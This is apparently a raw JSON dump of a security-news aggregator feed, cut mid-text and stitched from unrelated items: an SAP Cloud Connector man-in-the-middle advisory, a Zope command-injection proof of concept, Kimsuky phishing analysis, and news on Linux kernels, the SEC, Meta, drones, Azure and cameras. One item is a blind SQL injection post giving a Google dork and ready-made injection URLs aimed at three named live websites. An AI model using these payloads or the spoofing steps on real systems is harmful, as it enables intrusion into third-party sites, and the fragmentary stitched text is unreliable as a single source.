connectivity.us10.trial.applicationstudio.cloud.sap\nNote that the following endpoint, which is used for the initial certificate\nsigning request by SCC and to receive the BTP subaccount credentials, is\nnot susceptible to this issue.\n- connectivitycertsigning.cf.us10.hana.ondemand.com\nNonetheless, it suffices to silently eavesdrop and manipulate network traffic\nbetween SCC and SAP BTP by impersonating the two vulnerable endpoints above.\nWithout loss of generality, the first endpoint is taken as example to\ndemonstrate the issue by the following steps:\n1. Add an entry in /etc/hosts of the SCC host as below to resolve the host name\nto an attacker-controlled IP address:\n192.168.1.100 connectivitynotification.cf.us10.hana.ondemand.com\n2. Generate a self-signed certificate with the spoofed hostname as common name\n```\n$ openssl req -x509 -newkey rsa:4096 -keyout conn-noti-key.pem -out conn-noti-cert.pem -sha256 -days 3650 -nodes -subj \"/C=DE/ST=Baden-Wuerttemberg/L=Walldorf/O=SAP\nSE/OU=ITSecurity/CN=connectivitynotification.cf.us10.hana.ondemand.com\"\n```\n3.

The script, mkwsgiinstance, facilitates the setup of new Zope WSGI application instances and involves specifying the Python interpreter among other parameters via command-line arguments. The flaw stems from insufficient validation of the Python interpreter path, allowing an attacker to execute arbitrary shell commands.\n### Affected Product:\nProduct: Zope WSGI instance creation script (mkwsgiinstance)\nVersion: All versions prior to the most recent update\n-Impact:\nThis vulnerability permits an attacker with local access to the server to execute arbitrary commands with the privileges of the user running the mkwsgiinstance script. The potential impacts include unauthorized information disclosure\n### POC:\n```bash\n(env) root@lab:/opt/Zope# mkwsgiinstance -p \"/usr/bin/mkdir\" -d \"/tmp/temp;\"\nPlease choose a username and password for the initial user.\nThese will be the credentials you use to initially manage\nyour new Zope instance.\nUsername: d\nPassword:\nVerify password:\n(env) root@lab:/opt/Zope# ls /tmp\n'temp;'\n```\nIn this example, the attacker replaces the Python interpreter argument (-p) with the mkdir command, followed by an arbitrary directory path. Due to inadequate command-line argument sanitation, the script executes the mkdir command, thus illustrating arbitrary command execution.\n### Vulnerable Code Snippet:\n```python\nif opt in (\"-p\", \"--python\"):\npython = os.path.abspath(os.path.expanduser(arg))\nif not os.path.exists(python) and os.path.isfile(python):\nusage(sys.stderr, \"The Python interpreter does not exist.\")\nsys.exit(2)\n```\nThis code snippet fails to adequately validate the python variable that influences subprocess commands directly, enabling potential command injection when malicious inputs are utilized.\nCVSS Calculated Vulnerability Score:\nhttps://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n### Credits:\nThis vulnerability was disclosed by Aymane MAZGUITI / Ilyase Dehy.", "hash": "5d2af15d307b66bc28ec7c455f9b86e2781eaeea2f10cc3eeacd70ea0fa67cc9", "id": "0268c696-874a-4baa-9177-74252791dbe9", "link": "https://cxsecurity.com/issue/WLB-2024050046", "osint_source_id": "4fbf6fa5-9731-452b-b34b-7b702d6359fa", "published": "2024-05-16T20:44:51", "source": "http://cxsecurity.com/wlb/rss/all/", "story_id": "5a08307c-2f35-441b-8228-f19f80edb4f6", "title": "Zope 5.9 Command Injection"}], "tags": {"Python": {"name": "Python", "tag_type": "MISC"}, "Zope": {"name": "Zope", "tag_type": "MISC"}}, "title": "Zope 5.9 Command Injection"}, {"attributes": [{"created": "2024-05-17T01:15:48.910925", "id": "e18c4ab5-660b-4b9c-bafb-d3fa4f76c60f", "key": "NLP_BOT", "value": "4"}, {"created": "2024-05-17T01:08:48.447788", "id": "4161dd63-e8a4-42e0-841d-a1928d30cc18", "key": "WORDLIST_BOT", "value": "1"}], "created": "2024-05-16T20:44:22", "id": "d4573e06-71ab-42a1-96df-de781933adc1", "news_items": [{"author": "behrouz mansoori", "content": "*********************************************************\n#Exploit Title: VSP Softtech - Blind Sql Injection\n#Date: 2024-05-16\n#Exploit Author: Behrouz Mansoori\n#Google Dork: \"Developed by VSP Softtech\"\n#Category:webapps\n#Tested On: Mac, Firefox\n[+] First add \"and true\" and then \"and false\" to the end of the link :\n* Target.com/index.php?lang=1 true\n* Target.com/index.php?lang=1 false\n### Demo 1:\n* https://indupharma.co.in/product-detail.php?id=96%27%20and%20true--+\n* https://indupharma.co.in/product-detail.php?id=96%27%20and%20false--+\n* https://indupharma.co.in/product-detail.php?id=96%27%20/*!12345and*/%20/*!12345substring(@@version,1,1)*/=5--+\n### Demo 2:\n* https://waterlia.com/list_profile.php?id=1%27%20and%20true--+\n* https://waterlia.com/list_profile.php?id=1%27%20and%20false--+\n* https://waterlia.com/list_profile.php?id=1%27%20/*!12345and*/%20/*!12345substring(@@version,1,1)*/=5--+\n### Demo 3:\n* https://www.rajpathacademy.com/eng/book-details.php?id=173%27%20and%20true--+\n* https://www.rajpathacademy.com/eng/book-details.php?id=173%27%20and%20false--+\n* https://www.rajpathacademy.com/eng/book-details.php?id=173%27%20/*!12345and*/%20/*!12345substring(@@version,1,1)*/=5--+\n*********************************************************\n#Discovered by: Behrouz mansoori\n#Instagram: Behrouz_mansoori\n#Email: mr.mansoori@yahoo.com\n*********************************************************", "hash": "f6a708b57b3d3aa479cbcf931ef753935b057b3acdba25c94d7e1eb41993bb79", "id": "6338dc69-5248-45c3-8d06-975520272978", "link": "https://cxsecurity.com/issue/WLB-2024050045", "osint_source_id": "4fbf6fa5-9731-452b-b34b-7b702d6359fa", "published": "2024-05-16T20:44:22", "source": "http://cxsecurity.com/wlb/rss/all/", "story_id": "d4573e06-71ab-42a1-96df-de781933adc1", "title": "VSP Softtech - Blind Sql Injection"}], "tags": {"Behrouz": {"name": "Behrouz", "tag_type": "PER"}, "Behrouz Mansoori": {"name": "Behrouz Mansoori", "tag_type": "PER"}, "SQL Injection": {"name": "SQL Injection", "tag_type": "Cybersecurity"}, "VSP Softtech": {"name": "VSP Softtech", "tag_type": "ORG"}}, "title": "VSP Softtech - Blind Sql Injection"}, {"attributes": [{"created": "2024-05-17T01:25:57.242860", "id": "ce0e1d47-e48f-4aeb-99d7-af2c74ac61b4", "key": "NLP_BOT", "value": "5"}], "created": "2024-05-16T20:40:00", "id": "50ef7884-b80e-456d-8ece-a03c3e3488dd", "news_items": [{"author": "BeauHD", "content": "Palo Alto Networks Is Buying Security Assets From IBM (cnbc.com) 3\nPalo Alto Networks is acquiring IBM's QRadar cloud software and migrating customers to its Cortex Xsiam platform as part of a broader partnership aimed at expanding its consulting capabilities and customer base.

A new study says yes, but there's a fix\nIn a new white paper, Vendor Kernels, Bugs and Stability, the infrastructure software and Rocky Linux company CIQ presents a compelling argument that Linux vendor kernels are plagued with security vulnerabilities due to the flawed engineering processes that backport fixes.\nAlso: The top three Linux 6.9 kernel upgrades\nWhile this may shock some, it's an open secret in the Linux community. As Greg Kroah-Hartman, Linux stable kernel maintainer and a prominent member of the kernel security team, recently said: To be secure, you should always use the latest long-term stable kernel. The key word here is \"latest.\" It's not enough to use an LTS. You must use the most up-to-date release to be as secure as possible.\nUnfortunately, almost no one does that. Nevertheless, as Google Linux kernel engineer Kees Cook explained, \"So what is a vendor to do? The answer is simple: if painful: Continuously update to the latest kernel release, either major or stable.\"\nWhy? As Kroah-Hartman explained, \"Any bug has the potential of being a security issue at the kernel level.\"\nJonathan Corbet, Linux kernel developer and LWN editor-in-chief, agreed: \"In the kernel, just about any bug, if you're clever enough, can be exploitable to compromise the system. The kernel is in a unique spot in the system ... it turns a lot of ordinary bugs into vulnerabilities.\"\nWhat CIQ engineers Ronnie Sahlberg, Jonathan Maple, and Jeremy Allison did was to put hard numbers behind this position. Their paper shows that -- with current engineering practices -- almost all vendor kernels are inherently insecure and that securing those kernels is impossible.\nThat's because Linux vendor kernels have been created by taking a snapshot of a specific Linux release and then backporting selected fixes as changes occur in the upstream git tree. This method, designed in an era when out-of-tree device drivers were prevalent, aims to enhance stability and security by selecting changes to backport. This paper examines how this works in practice by analyzing the change rate and bug count in Red Hat Enterprise Linux (RHEL) 8.8, kernel version 4.18.0-477.27.1, comparing it to upstream kernels from kernel.org.\nAlso: How Red Hat is embracing AI to make sysadmins' lives easier\nAlthough the programmers examined RHEL 8.8 specifically, this is a general problem. They would have found the same results if they had examined SUSE, Ubuntu, or Debian Linux. Rolling-release Linux distros such as Arch, Gentoo, and OpenSUSE Tumbleweed constantly release the latest updates, but they're not used in businesses.\nTheir analysis of the RHEL 8.8 kernel reveals 111,750 individual commits in the change log. This data, while not detailing the content or size of the commits, provides a general understanding of the backporting process. Initially, there was a steady rate of backporting, but this decreased around November 2021 and again significantly in November 2022, corresponding with the release of RHEL 8.5 and RHEL 8.7, respectively. This pattern, the authors believe, reflects a shift toward more conservative backporting to enhance stability as the major release cycle progresses.\nTheir examination found 5,034 unfixed bugs in RHEL 8.6; 4,767 unfixed bugs in RHEL 8.7; and 4,594 unfixed bugs in RHEL 8.8.\nThese figures represent known bugs with upstream fixes that have not been backported to RHEL. The earlier cessation of backporting in RHEL 8.6 and 8.7 has led to more unfixed bugs compared to RHEL 8.8. Red Hat's practice of not publishing the complete source code changes adds complexity, resulting in possible false positives and negatives in the data CIQ had to work with. Despite these limitations, CIQ reports that manual checks suggest a high accuracy in identifying missing fixes.\nAlso: Ubuntu 24.04: This great new Linux distro isn't just fast - it's a fortress\nContrary to the assumption that bugs are quickly fixed upstream, many persist for extended periods before resolution. This delay impacts kernel quality, as the slowing back-porting process results in an increasing number of known, unfixed bugs, which undermines kernel stability and security over time.\nSince Linux kernel developers have taken over managing Linux's Common Vulnerabilities and Exposures (CVEs), 270 new CVEs in March 2024 and 342 in April 2024 have been reported. These have already been fixed in the stable Linux kernel git branch.\nStill, the sheer numbers underscore the importance of using stable upstream kernels for enhanced security. The volume of new CVEs and the lack of an embargo period for fixes necessitate a proactive approach from organizations in evaluating and addressing these vulnerabilities.\nBesides, although RHEL 8.8 hasn't been actively developed since late 2022, about 10% of all newly discovered bugs still affect it. RHEL 8.8's last major set of bug fixes came in May 2023. The same is true of other, older (but still supported) enterprise Linux distros. More troubling still, according to CIQ: \"Some of the missing fixes we examined are explicitly disclosed as being exploitable from user space.\"\nAlso: Linus Torvalds takes on evil developers, hardware errors and 'hilarious' AI hype\nTherefore, the CIQ team concluded the traditional vendor kernel model, characterized by selective backporting, is flawed. The growing number of known, unfixed bugs suggests that vendor kernels are less secure than upstream stable kernels. The team advocates for a shift toward using stable kernel branches from kernel.org for better security and bug management.\nAccording to the authors, \"this creates a strong incentive\" for security-conscious customers to adopt stable kernels over vendor-specific ones. They assert, \"We believe that the only realistic way for a customer to know they run a kernel that is as secure as possible is to switch to a stable kernel branch.\"\nThis paper is not a critique of the dedicated Linux vendor kernel engineers. Instead, it's an invitation for the industry to rally behind kernel.org stable kernels as the optimal long-term solution. Such a shift would allow engineers to focus more on fixing customer-specific bugs and enhancing features rather than the labor-intensive backporting process.\nTherefore, they have four critical conclusions:\nThe vendor kernel model is broken and beyond repair.\n-\nVendor kernels are inherently insecure, with late-cycle stabilized vendor kernels being particularly vulnerable.\n-\nThe sheer number of known open bugs makes analyzing or classifying them all impractical.\n-\nUpstream stable kernels offer significantly better protection against security vulnerabilities and bugs in the kernel code.\n-\nAlso: This backdoor almost infected Linux everywhere: The XZ Utils close call\nSo, will vendors do this? For all the good security reasons to move to upstream stable kernels, there are counter-arguments, which boil down to this: If you're always upgrading to the most recent kernel, you may also run into stability problems. A program that works just fine with the 4.18.0-477.27.1 kernel might not work with 4.18.0-477.27.1.el8_8. Of course, in that specific case, the newer kernel fixed an important security bug.\nIt all comes down to a delicate balancing act between security and stability. Some top Linux kernel developers and CIQ are coming down on the side of security.

The SEC did not say how it is distinguishing between large and small entities.\nThe new amendments come right as companies are easing into new incident reporting regulations from the SEC that force public companies to notify the agency of \u201cmaterial\u201d incidents. Several large companies \u2014 including Microsoft, Hewlett Packard, Frontier and others \u2014 have already had to submit 8-K filings about cybersecurity incidents.\nEarlier this month, Rep. Andrew Garbarino (R-NY) revived an effort to rescind the SEC incident reporting rule. Garbarino has repeatedly argued in hearings and in speeches that the SEC is ill-equipped to handle issues around cybersecurity and that the incident reports expose victimized companies to further attacks. The White House has said it will veto any legislative attempt to rescind the SEC rule.\nCybersecurity experts lauded the SEC for the amendment unveiled on Thursday, with several arguing that the years of voluntary cybersecurity rules have contributed to the current lackadaisical attitude many organizations have when it comes to cyberattacks and breaches.\n\u201cThe SEC continuing to modernize their policies and requirements to bring cybersecurity requirements is a major step towards protecting consumer data. Providing timely notification allows consumers to take the steps necessary to protect their financial and personal data before it can be further exploited,\u201d said Bugcrowd CEO Dave Gerry.\nZendata CEO Narayana Pappu added that the SEC is clearly doubling down to enhance cybersecurity and consumer information protection.\nThis latest announcement, along with the cyber disclosure requirements for CISOs that went into effect in January, put an increased emphasis on proactive monitoring and reporting, which to date has for the most part been lacking, Pappu said.\nJonathan Greig\nis a Breaking News Reporter at Recorded Future News.

The proceedings follow a raft of requests for information to parent entity Meta since the bloc's online governance regime, the Digital Services Act (DSA), started applying last August. The development could be significant as the formal proceedings unlock additional investigatory powers for EU enforcers, such as the ability to conduct office inspections or apply interim measures. Penalties for any confirmed breaches of the DSA could reach up to 6% of Meta's global annual turnover.\nMeta's two social networks are designated as very large online platforms (VLOPs) under the DSA. This means the company faces an extra set of rules -- overseen by the EU directly -- requiring it to assess and mitigate systemic risks on Facebook and Instagram, including in areas like minors' mental health. In a briefing with journalists, senior Commission officials said they suspect Meta of failing to properly assess and mitigate risks affecting children. They particularly highlighted concerns about addictive design on its social networks, and what they referred to as a \"rabbit hole effect,\" where a minor watching one video may be pushed to view more similar content as a result of the platforms' algorithmic content recommendation engines.\nCommission officials gave examples of depression content, or content that promotes an unhealthy body image, as types of content that could have negative impacts on minors' mental health. They are also concerned that the age assurance methods Meta uses may be too easy for kids to circumvent. \"One of the underlying questions of all of these grievances is how can we be sure who accesses the service and how effective are the age gates -- particularly for avoiding that underage users access the service,\" said a senior Commission official briefing press today on background. \"This is part of our investigation now to check the effectiveness of the measures that Meta has put in place in this regard as well.\" In all, the EU suspects Meta of infringing DSA Articles 28, 34, and 35.

Ultimately, he figured it couldn\u2019t be that hard to build own portable fume extractor instead.\nThe build is based around a mighty 110-watt centrifugal fan from an IBM server that\u2019s rated at approximately 500 CFM. It\u2019s a hefty unit, and it should be, given that it retails at over $200 on DigiKey. [Anthony] paired this fan with off-the-shelf HEPA and activated carbon filters. These are readily available from a variety of retailers. He didn\u2019t want to DIY that part of the build, as the filter selection is critical to ensuring the unit actually captures the bad stuff in the air. He ended up building a custom power supply for the 12-volt fan, allowing it to run from common drill batteries for practicality\u2019s sake.\nFew of us have need for such a beefy fume extractor on the regular. Indeed, many hobbyists choose to ignore the risk from soldering or 3D printing fumes. Still, for those that want a beefy fume extractor they can build themselves, it might be worth looking over [Anthony]\u2019s initial work.\nWe\u2019ve seen some other great DIY fume extractors before, too. Even those that use drill batteries!

It\u2019s currently changed a bunch since I last updated this article (1yr ago) and the PCB has been completely redesigned. The one I posted was a proof of concept. The writeup is very much not completed yet. I have a bunch of more images and content that I\u2019m working on that has not been uploaded yet so stay tuned :D\nIt is a cool project! I have several old PC power supplies that could be repurposed in a similar way, as all I am using now is a old far without an enclosure.\nThanks! I actually found my first one of these server fans in ewaste and it just so happened to be the perfect fume extractor testbed.\nExcept it\u2019s not extracting anything, it just spreads fumes around.\nA cheap ducted fan and elastic pipe would actually move fumes outside.\nThis is a centrifugal fan with several stages of filtration. The above photo is not showing the fan project in it\u2019s full extend. I\u2019m updating my project site with more images at this moment to show what I\u2019m up to. It uses a slide on carbon and HEPA filter assembly that\u2019s rather elegant.\nNice build! I love the internal shot of the blower motor assembly.\nThanks! I enjoyed the rendering work quite a bit but I\u2019ll need to update some renders to include the newer parts :D\nIf anyone reading this has found a source for inexpensive flexible tubing that\u2019s like 75-100mm in diameter so I can bend the intake down to sit right over where I\u2019m working, I\u2019d love to hear what they\u2019ve found. There\u2019s lots of stuff in the 12-25mm range, but large tubing that you can bend and that then maintains its shape is a lot harder to find.\nUse the cheap stuff that\u2019s super flexible and doesn\u2019t hold its shape, and stick the end on an arm you can position as you want. If you look on eBay etc you\u2019ll find dust collector hoods designed for this.\nThis is the normal solution used by turners etc.\nI really like the hakko stuff, it holds its shape, but it is a bit pricey:\nhttps://www.digikey.com/en/products/detail/american-hakko-products-inc/C1572/6228792\nPlease be kind and respectful to help make the comments section excellent.

The FBI and Cybersecurity and Infrastructure Security Agency warned in January that Chinese-made drones pose a \u201csignificant risk\u201d to critical infrastructure. Currently, they account for the majority of the U.S. market.\n\"The extensive deployment of Chinese manufactured drones in U.S. critical sectors is a national security concern and it may increase the risk of unauthorized access to sensitive systems and data,\u201d Rep. August Pfluger (R-TX) said.\nDaughtry told Congress that while the NYPD will begin buying devices from American manufacturers, he has personally contacted the CEOs of top U.S. drone makers to tell them DJI\u2019s \u201cperform better than your drones.\u201d\n\u201cThey have capabilities that locals can't offer on that cost-by-cost basis and we're talking about a weapon or a tool that our frontliners need to protect our lives,\u201d Daughtry said.\nThe NYPD will soon link the drones to ShotSpotter, which will send the longitude and latitude of gunshots to drone stations located in the five selected precincts located in Brooklyn, the Bronx and Central Park, Daughtry said.\nAn alert will then be sent to a drone pilot based in the NYPD\u2019s Joint Operations Center, who will activate the drone to autonomously fly to the location, Daughtry said. Officers will be able to see a visual of the crime scene produced by the drone via their smartphones before they arrive at the crime scene.\nEach of the five precincts\u2019 target areas will be outfitted with two drone platforms attached to rooftops, Daughtry said.\nThe pairing of the drones with the gunshot detection system is likely to provoke community push-back. Civil liberties advocates and many community leaders in high-crime neighborhoods say ShotSpotter is unreliable and fuels racially-biased policing.\nMore than 1,400 U.S. police departments use drones, according to a July 2023 report from the ACLU, which noted that the first program similar to what New York City is planning was implemented in Chula Vista, California in 2019. It is unclear if that program links drones to ShotSpotter reports.\n\u201cThe number of cities and towns following suit \u2014 already more than a dozen \u2014 is poised to explode, along with other police uses of the technology,\u201d the ACLU report said, referring to drones as first responders.\nDrones have played a vital role in select NYPD operations in recent months, including in the department\u2019s response at a Columbia University building that students had seized while protesting Israel\u2019s ongoing attacks on Gaza, according to John Chell, the department\u2019s chief of patrol.\nDaughtry defended their use responding to potential crimes.\n\"[Drone as first responder] will enhance officer situational awareness as they arrive on the scene and promote officer safety and help deploy resources more effectively,\" he told the committee.\nThe city\u2019s 6,300 miles of streets and highways, 472 subway stations and 274 public housing developments are currently served by 85 drones, he said.\nThe police department\u2019s drone usage increased by 420% from 2022 to 2023, but he said the technology is not used for warrantless surveillance, routine patrol, traffic enforcement or immobilizing suspect vehicles. They also are not outfitted with weapons, Daughtry said.\nSuzanne Smalley\nis a reporter covering privacy, disinformation and cybersecurity policy for The Record.

In a further attempt to increase the likelihood of success of the infection, the file is disguised as an innocuous Word file using the word processor's icon.\nShould a victim launch the MSC file and consent to opening it using Microsoft Management Console (MMC), they are displayed a console screen containing a Word document that, when launched, activates the attack sequence.\nThis involves running a command to establish a connection with an adversary-controlled server (\"brandwizer.co[.]in\") to display a document hosted on Google Drive (\"Essay on Resolution of Korean Forced Labor Claims.docx\"), while additional instructions are executed in the background to set up persistence as well as collect battery and process information.\nThe gathered information is then exfiltrated to the command-and-control (C2) server, which is also capable of harvesting IP addresses, User-Agent strings, and timestamp information from the HTTP requests, and delivering relevant payloads as necessary.\nGenians said that some of the tactics, techniques, and procedures (TTPs) adopted in the campaign overlap with prior Kimsuky activity disseminating malware such as ReconShark, which was detailed by SentinelOne in May 2023.\n\"In the first quarter of this year, spear phishing attacks were the most common method of APT attacks reported in South Korea,\" the company noted. \"Although not commonly reported, covert attacks via social media are also occurring.\"\n\"Due to their one-on-one, personalized nature, they are not easily detected by security monitoring and are rarely reported externally, even if the victim is aware of them.

We've developed robust solutions that enable you to transfer your files and folders to Azure, tailored to meet your specific migration needs.\n \n\n\n\n\n\n\n\nAt times, the optimal approach is to migrate your files and folders via your network from on-premises to Azure. In such instances, we provide Azure Storage Mover, a fully-managed migration service. Learn more\n\n\n\n\n \n\n\n \n\n\n\n\n\nAlternatively, migrating data offline might be more suitable: Azure Data Box allows you to transport terabytes of data to Azure swiftly, affordably, and dependably. You will receive a specialized Data Box storage device to load with your data and send directly to an Azure data center. Learn more\n\n\n\n\n \nDid you know these two services can be comnined to form an effective file and folder migration solution that you can use to predict and minimize downtime for your workloads?\n \n \nOffline migration, online catch-up\n \nUtilizing Azure Data Box likely conserved a significant amount of bandwidth. However, any active workload on your source storage likely made changes while your Data Box was in transit to Azure.Consequently, you'll also need to bring those changes to your cloud storage, before a workload can be cut-over to it.Catch-up copies typically need minimal bandwidth since most of the data already resides in Azure, and only the delta needs to be transferred. Azure Storage Mover is an excellent tool for this purpose.\n \n\n\u2003\nWe ensure that Storage Mover jobs can detect the differences between your on-site storage and cloud storage. Storage Mover will then effectively transfer any updates and new files not previously captured by your Data Box transfer.\nMaximizing your upload bandwidth is crucial. For instance, if only a file's metadata (such as permissions) has changed, Storage Mover will upload only the new metadata instead of the entire file content.\n \nStorage Mover's copy modes, merge and mirror, allow you to tailor your cloud storage updates to your specific needs.\nStorage Mover can be also used independently of Data Box.\n \nOf course, you can also use Storage Mover without Data Box. In that case you\u2019d migrate entirely over your network. Using Data Box may bring both time and bandwidth savings but isn\u2019t needed in every migration scenario.\n \n \nMinimizing and predicting workload downtime\n \nWhen transitioning on-premises workloads to Azure Storage, you typically aim to:\n\nReduce the duration your on-prem application is offline during the switch.\nEstablish a predictable downtime period for users and business operations reliant on the workload.\n\nAzure Storage Mover is designed to assist in achieving both goals.\n \n\n\n\n\n\nThe idea behind this approach is that you migrate your data from source to target several times. Whether you opt for Data Box or Storage Mover, the initial transfer will be the most time-consuming, as it requires moving all your data to the cloud.\u00a0\n\u00a0\nHow long exactly this first copy will take, depends on many factors and is hard to predict. Therefore, it is not advisable to take any workloads that depend on this data offline prior to initiating this bulk copy step. Instead, maintain your workloads active on the source data.\n\n\n\n\n\n\n\n\n\nKeeping your workloads active on the source constantly introduces changes and new files to the source. It may even prevent some of your files from being migrated, because they are in use. But that\u2019s OK.\n\u00a0\nAfter your bulk migration finishes, you immediately start this catch-up migration job. Now, you only need to transfer the changes that have occurred since the initial bulk migration started. Likely, this catch-up migration job will complete more quickly since there are fewer bytes that need to be transferred across your network.\n\n\n\n\n\n\n\n\n\n\nThis speed-up migration job is optional. Initiate this job immediately after the completion of the preceding \"catch-up\" job.\n\u00a0\nAs the last job concluded more quickly than the initial \"bulk-migration\" job, there was less time for changes to accumulate. Consequently, this speed-up job is expected to complete even more swiftly.\n\u00a0\nMultiple speed-up jobs can be executed consecutively. Eventually, you will reach a point where the processing time of a job is no longer decreasing, and reaches it's minimum for the given namespace. At this stage, almost no data needs to be transferred over the network, and the majority of the time is spent on determining whether a file requires migration. Additional local compute cores and RAM can be beneficial.\n\n\n\n\n\n\n\n\n\nOnce your speed-up copy job(s) no longer finish any faster than the preceding ones, it's probable that you've reached the minimum that the combination of your namespace (number of files) and the local compute resources allow for.\n\u00a0\nThis implies that executing an additional job will probably complete in a similar timeframe. You have identified a predictable, minimal downtime for your workload(s) that depend on this namespace.\n\u00a0\n\nIt's time to take the workloads offline for this predicted period.\nExecute your final migration job.\nAfter its completion, connect your workload to the fully migrated data in the cloud.\n\nAnd just like that, you are up and running again.\n\n\n\n\n\n\nIt's important to note the limitations of this method.\nAn extensive collection of small files with a high change rate might necessitate longer downtime. Moreover, this technique won't capture files that are in constant use until the final cut-over migration job. If there's a considerable number of such files or their total size is large, achieving a predictable minimum with this method is hardly feasible.\n\u00a0\nConsequently, this method is not suitable for migrating active database files, for example. The convergent, n-pass migration strategy is designed for general-purpose namespaces. For databases or files that are always open, it's best to use specialized migration tools tailored for those specific workloads.\n\u00a0\n\u00a0\nReady to get started?\n\u00a0\nData Box:\n\nDocumentation home\nWhich Data Box device is right for me?\nTraining: Import data offline with Data Box\n\nStorage Mover\n\nDocumentation home\nStorage Mover overview\u00a0\nPlan for a storage mover deployment\n\n", "hash": "63b8361ad881ef8e6d1753a92752e4062726d9d75270a03e9c142ef5774c1ad9", "id": "25930da8-3e42-4e7d-a0ad-aac05ba995be", "link": "https://techcommunity.microsoft.com/t5/azure-storage-blog/storage-migration-combine-azure-storage-mover-and-azure-data-box/ba-p/4143354", "osint_source_id": "0c4fb663-1b11-4849-bc50-10a20eb1496b", "published": "2024-05-16T18:29:48", "source": "https://techcommunity.microsoft.com/plugins/custom/microsoft/o365/custom-blog-rss?tid=-1562856755638734148&amp;board=Exchange&amp;label=Security&amp;messages=&amp;size=30", "story_id": "f63edd8c-5b6f-45af-bf18-7e3ffc2f230d", "title": "Storage migration: Combine Azure Storage Mover and Azure Data Box"}], "tags": {"Storage Mover": {"name": "Storage Mover", "tag_type": "ORG"}}, "title": "Storage migration: Combine Azure Storage Mover and Azure Data Box"}, {"attributes": [{"created": "2024-05-16T17:11:52.036469", "id": "eeee3296-e190-4585-9424-ceb948c5bf7f", "key": "WORDLIST_BOT", "value": "1"}, {"created": "2024-05-16T17:17:24.371490", "id": "1026fc73-3648-4b41-a481-d4817fe3b5eb", "key": "NLP_BOT", "value": "3"}], "created": "2024-05-16T18:25:00", "id": "cfc67265-1cf2-4768-8c58-152718d9b6db", "news_items": [{"author": "Leo Becker", "content": "iCloud Mail: Apple bekommt Phishing- und Spam-Flut nicht in den Griff\nApples Spamfilter arbeitet aktuell unzuverl\u00e4ssig: Viele iCloud-Nutzer berichten von einem ungew\u00f6hnlich hohen Aufkommen an Phishing und Spam.\nVermeintliche Paketzustellungen, Gewinnbenachrichtigungen und angeblich kostenloser iCloud-Speicherplatz: Spam- und Phishing-Mails fluten aktuell ungebrochen die Posteing\u00e4nge vieler iCloud-Mail-Nutzer.

Mit einem Gewicht von rund 883 Gramm und einer kompakten Bauweise ist sie die leichteste Kamera der Mittelformatreihe.\nGFX 102MP CMOSII-Sensor und Pixel-Shift-Funktion\nDie GFX100S II ist wie ihre gro\u00dfe Schwester mit dem neu entwickelten 102-Megapixel-Gro\u00dfformatsensor (\"GFX 102MP CMOSII\") ausgestattet. Dieser ist etwa 1,7-mal so gro\u00df wie ein 35-mm-Vollformatsensor und verf\u00fcgt \u00fcber eine Grundempfindlichkeit von ISO 80 sowie einen optimierten Dynamikbereich. Dar\u00fcber hinaus ist die Kamera mit einem Hochgeschwindigkeits-Bildprozessor, dem \"X-Prozessor 5\", ausgestattet, der f\u00fcr einen besonders schnellen Autofokus sorgt. So stellt der Autofokus mithilfe von KI und maschinellem Lernen nicht auf Augen und Menschen scharf, sondern erkennt auch Tiere, V\u00f6gel, Insekten, Drohnen, Autos, Motorr\u00e4der, Fahrr\u00e4der, Z\u00fcge und Flugzeuge. Ein Feature, das alle neuen Fujifilm-Kameras bieten.\nDie GFX100S II verf\u00fcgt \u00fcber einen integrierten 5-Achsen-Bildstabilisator, der laut Hersteller der fortschrittlichste seiner Klasse ist und bis zu acht EV-Stufen l\u00e4ngere Belichtungszeiten erm\u00f6glicht \u2013 zwei Stufen mehr als beim Vorg\u00e4ngermodell GFX100S. Der bewegliche GFX 102MP CMOSII-Sensor verf\u00fcgt zudem \u00fcber eine Pixel-Shift-Funktion. Mit dieser sogenannten \u201ePixel Shift Multi Shot\u201c-Funktion k\u00f6nnen 16 RAW-Bilder gemacht werden, wobei der Sensor bei jeder Aufnahme um 0,5 Pixel verschoben wird. Die 16 Bilder k\u00f6nnen dann in der Nachbearbeitung mit einer \u201ePixel Shift Combiner\u201c-Software zu einem Bild mit bis zu 400 Megapixeln zusammengesetzt werden.\nHohe Verschlusszeiten und 4K-Videos\nDie Verschlusszeiten der GFX100S II betragen mit dem mechanischen Verschluss 1/4.000 Sekunden und mit dem elektronischen Verschluss 1/16.000 Sekunden, die gro\u00dfe Schwester GFX100 II bietet hier sogar beachtliche 1/32.000 Sekunden. Mit der Serienbildfunktion von bis zu sieben Bildern pro Sekunde und mehr als 184 JPEGs oder 30 komprimierten RAW-Bildern in Folge ist die neue Mittelformatkamera zwar auch schnell, aber nicht so schnell wie die GFX100, die acht Bilder pro Sekunde schafft.\nDie Kamera ist auch f\u00fcr Videoaufnahmen geeignet und kann Videos in 4K-Qualit\u00e4t mit 30 Bildern pro Sekunde aufnehmen. Die Videos werden mit einer Farbtiefe von 4:2:2 und 10 Bit auf der SD-Karte gespeichert, wof\u00fcr die Kamera \u00fcber zwei SD-Slots verf\u00fcgt. Zus\u00e4tzlich besteht die M\u00f6glichkeit der Videoaufzeichnung auf einer externen SSD, sodass auch Videos im hochwertigen, aber besonders speicherfressenden Apple ProRes.K Codec m\u00f6glich sind.\nDie GFX100S II soll anspruchsvolle Fotografinnen und Fotografen ansprechen, die Wert auf eine besonders hohe Bildqualit\u00e4t legen, wie beispielsweise Mode- oder Landschaftsfotografen. Gleichzeitig m\u00f6chte Fujifilm mit dieser spiegellosen Mittelformatkamera einen einfachen und etwas g\u00fcnstigeren Einstieg in die Gro\u00dfformatfotografie erm\u00f6glichen.\nDie GFX100S II ist ab Mitte Juni 2024 zu einem Preis von rund 5.500 Euro im Handel erh\u00e4ltlich.\nNeues Mittelformat-Objektiv \u2013 Fujinon GF500mm F5.6 R LM OIS WR\nPassend zur GFX100S II bietet Fujifilm auch ein Super-Teleobjektiv an. Das GF500mmF5.6 R LM OIS WR hat eine Brennweite von bis zu 500 mm, was 396 mm im Kleinbildformat entspricht. Es ist damit das l\u00e4ngste Objektiv der GFX-Serie von Fujifilm und wiegt rund 1.375 Gramm. In Kombination mit dem Fujinon Telekonverter GF1.4X TC WR, der die Brennweite des Objektivs verl\u00e4ngert, kann eine maximale Brennweite von 700 mm (entsprechend 554 mm bei Kleinbild) erreicht werden. Die leichte Bauweise, der leistungsstarke Bildstabilisator und der schnelle Autofokus machen das Super-Teleobjektiv besonders f\u00fcr Sport- und Naturfotografen interessant.\nDas Fujinon GF500mm ist ab Mitte Juni f\u00fcr rund 3900 Euro 